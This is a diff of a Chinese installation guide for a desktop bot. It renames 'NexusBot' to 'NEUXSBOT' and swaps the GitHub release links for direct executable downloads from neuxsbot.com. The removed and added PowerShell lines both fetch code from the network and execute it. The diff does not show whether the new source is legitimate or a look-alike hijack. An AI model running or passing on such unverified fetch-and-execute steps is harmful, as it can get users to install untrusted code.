@@ -1,6 +1,6 @@
-# 📖 NexusBot 安装指南
+# 📖 NEUXSBOT 安装指南
 
-本指南将帮助你在 Windows、macOS 或 Linux 系统上安装 NexusBot。
+本指南将帮助你在 Windows、macOS 或 Linux 系统上安装 NEUXSBOT。
 
 ---
 
@@ -25,17 +25,19 @@
 ### 方法 1: 安装版（推荐）
 
 1. **下载安装包**
-   - 访问 [GitHub Releases](https://github.com/Markovmodcn/openclaw-china/releases/latest)
-   - 下载 `NexusBot-Setup.exe`
+   - 直接下载：
+     `https://www.neuxsbot.com/api/v1/system/public/download/version/11d86bdf-b659-4aee-a090-972029779355/windows.exe`
+   - 或访问官网：
+     `https://www.neuxsbot.com/download`
 
 2. **运行安装程序**
-   - 双击 `NexusBot-Setup.exe`
+   - 双击安装包
    - 按照安装向导提示操作
-   - 选择安装位置（默认：`C:\Program Files\NexusBot`）
+   - 选择安装位置（默认：`C:\Program Files\NEUXSBOT`）
 
 3. **完成安装**
    - 安装完成后会自动创建桌面快捷方式
-   - 双击快捷方式启动 NexusBot
+   - 双击快捷方式启动 NEUXSBOT
 
 ### 方法 2: 绿色版
 
@@ -49,7 +51,9 @@
 ### 方法 3: 脚本安装
 
 ```powershell
-iwr -useb https://raw.githubusercontent.com/Markovmodcn/openclaw-china/main/scripts/install.ps1 | iex
+$installer = Join-Path $env:TEMP 'NEUXSBOT-Setup-0.1.21.exe'
+Invoke-WebRequest -Uri 'https://www.neuxsbot.com/api/v1/system/public/download/version/11d86bdf-b659-4aee-a090-972029779355/windows.exe' -OutFile $installer
+Start-Process -FilePath $installer
 ```
 
 ---
@@ -113,7 +117,7 @@ docker run -d \
 
 ## ✅ 验证安装
 
-安装完成后，启动 NexusBot，你应该看到：
+安装完成后，启动 NEUXSBOT，你应该看到：
 - 欢迎界面
 - 配置向导
 - 系统托盘图标
